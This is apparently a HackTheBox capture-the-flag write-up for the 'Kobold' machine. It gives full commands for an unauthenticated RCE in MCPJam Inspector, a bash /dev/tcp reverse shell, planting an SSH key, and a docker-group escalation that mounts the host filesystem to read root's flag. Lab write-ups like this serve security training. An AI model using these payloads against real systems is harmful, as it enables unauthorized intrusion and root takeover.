# Kobold — HackTheBox Writeup

| Field | Details |
|---|---|
| **Platform** | HackTheBox |
| **Machine** | Kobold |
| **OS** | Linux (Ubuntu 24.04) |
| **Difficulty** | Easy |
| **Season** | Season 10 |
| **Release Date** | March 21, 2026 |
| **Tags** | MCP, Docker, PrivateBin, AI Infrastructure |

---

## Synopsis

Kobold is an Easy-rated Linux machine themed around modern AI infrastructure vulnerabilities. Initial access is achieved by exploiting an unauthenticated RCE in the MCPJam Inspector via its stdio transport. Privilege escalation abuses an inconsistency between `/etc/group` and `/etc/gshadow` that allows `newgrp docker`, followed by a classic Docker host filesystem escape to read the root flag.

---

## Enumeration

### Port Scan

```bash
nmap -Pn -sC -sV -p- -T4 --min-rate 5000 <TARGET_IP>
```

**Key findings:**

- `22/tcp` — OpenSSH 9.6p1
- `80/tcp` — nginx (redirects to `https://kobold.htb`)
- `443/tcp` — nginx with TLS cert: `commonName=kobold.htb`, SAN: `*.kobold.htb`
- `3552/tcp` — Golang HTTP server (Arcane Docker Management UI)

The wildcard SAN on the TLS cert indicates virtual host routing — multiple subdomains host different applications.

### /etc/hosts

```
<TARGET_IP>  kobold.htb bin.kobold.htb
```

### Virtual Host Enumeration

```bash
ffuf -u "https://<TARGET_IP>" \
  -k \
  -H "Host: FUZZ.kobold.htb" \
  -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt \
  -mc all \
  -fs 154
```

**Discovered subdomains:**

| Subdomain | Service |
|---|---|
| `mcp.kobold.htb` | MCPJam Inspector (React SPA on port 6274) |
| `bin.kobold.htb` | PrivateBin 2.0.2 (PHP in Docker container) |

### Service Summary

| Endpoint | Description |
|---|---|
| `kobold.htb` | Static landing page — "Kobold Operations Suite" |
| `mcp.kobold.htb` | MCPJam Inspector — tool for connecting to and testing MCP (Model Context Protocol) servers |
| `bin.kobold.htb` | PrivateBin — zero-knowledge encrypted pastebin |
| `<IP>:3552` | Arcane v1.13.0 — Docker container management API + UI |

---

## Initial Access — MCPJam stdio RCE

### Understanding MCPJam

MCPJam Inspector is a debugging tool that connects to MCP (Model Context Protocol) servers. Its API endpoint `/api/mcp/connect` accepts a `serverConfig` object specifying how to connect. Critically, it supports a `stdio` transport type that **spawns a local process** on the server hosting MCPJam.

**The vulnerability:** No authentication is required to call `/api/mcp/connect`, and the `stdio` transport executes arbitrary commands server-side.

### Confirming Server-Side Execution

First, confirm the API requires correct fields via its self-documenting errors:

```bash
# Step 1 — missing serverConfig
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"url":"http://...","transport":"sse"}'
# {"success":false,"error":"serverConfig is required"}

# Step 2 — missing serverId
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"type":"sse","url":"http://YOUR_IP:80"}}'
# {"success":false,"error":"serverId is required"}
```

Confirm the connection is server-side by running a listener and pointing MCPJam at your IP — you receive an inbound connection from the target.

### Reverse Shell

Start a listener:

```bash
nc -lvnp 4444
```

Fire the payload. The `&` backgrounds the shell so MCPJam sees bash exit cleanly:

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "shell",
    "serverConfig": {
      "type": "stdio",
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1 &"]
    }
  }'
```

**Result:** Shell as `ben`.

### Shell Stabilization

```bash
# On target
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# Optionally — add SSH key for a stable session
mkdir -p /home/ben/.ssh
echo "YOUR_PUBKEY" >> /home/ben/.ssh/authorized_keys
chmod 700 /home/ben/.ssh
chmod 600 /home/ben/.ssh/authorized_keys
```

Then SSH in:

```bash
ssh -i /tmp/key ben@<TARGET_IP>
```

---

## User Flag

```bash
cat /home/ben/user.txt
```

---

## Privilege Escalation — gshadow Inconsistency → Docker Escape

### Enumeration as ben

```bash
id
# uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)

cat /etc/group | grep docker
# docker:x:111:alice

cat /etc/gshadow | grep docker
# docker:!::alice,ben     ← ben IS listed here!
```

**Key finding:** `/etc/group` does not list ben in the docker group, but `/etc/gshadow` does. The `newgrp` command consults `/etc/gshadow`, so ben can activate docker group membership.

### Activate Docker Group

```bash
newgrp docker
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)

docker ps
# CONTAINER ID  IMAGE                               ...  NAMES
# 4c49dd7bb727  privatebin/nginx-fpm-alpine:2.0.2   ...  bin
```

### Docker Host Filesystem Escape

The `privatebin/nginx-fpm-alpine:2.0.2` image is already present on the host. Spin up a container as root, mount the entire host filesystem, and chroot in:

```bash
docker run --rm -it -u 0 --entrypoint sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```

Inside the container:

```sh
chroot /mnt
cat /root/root.txt
```

**Result:** Root flag.

---

## Why This Works

Mounting the host `/` into a container and running as root (`-u 0`) gives you root-level access to the entire host filesystem from inside the container. By chrooting into `/mnt`, you fully switch into the host's filesystem context with no restrictions. **Access to the Docker socket is functionally equivalent to root on the host.**

---

## Full Attack Chain

```
nmap → wildcard TLS cert → ffuf vhost enum
         ↓
mcp.kobold.htb → MCPJam Inspector
         ↓
/api/mcp/connect (unauthenticated, stdio transport)
         ↓
bash -i >& /dev/tcp/... → shell as ben
         ↓
/etc/gshadow lists ben in docker group
         ↓
newgrp docker → docker group activated
         ↓
docker run -u 0 -v /:/mnt + chroot → root
```

---

## Key Takeaways

- **MCPJam's stdio transport** spawns processes directly on the server — exposing it unauthenticated is equivalent to unauthenticated RCE.
- **`/etc/group` vs `/etc/gshadow` inconsistency** — `newgrp` reads gshadow, not group. A discrepancy between the two can grant group membership that appears absent from the standard `id` output.
- **Docker group = root** — any user in the docker group can mount the host filesystem into a privileged container and escape.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning & service detection |
| ffuf | Virtual host enumeration |
| curl | API interaction & exploit delivery |
| nc | Reverse shell listener |
| docker | Container escape |

---

## References

- [HackTricks — Docker Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
- [GTFOBins — Docker](https://gtfobins.github.io/gtfobins/docker/)
- MCPJam Inspector — Model Context Protocol debugging tool
- Arcane Docker Manager v1.13.0
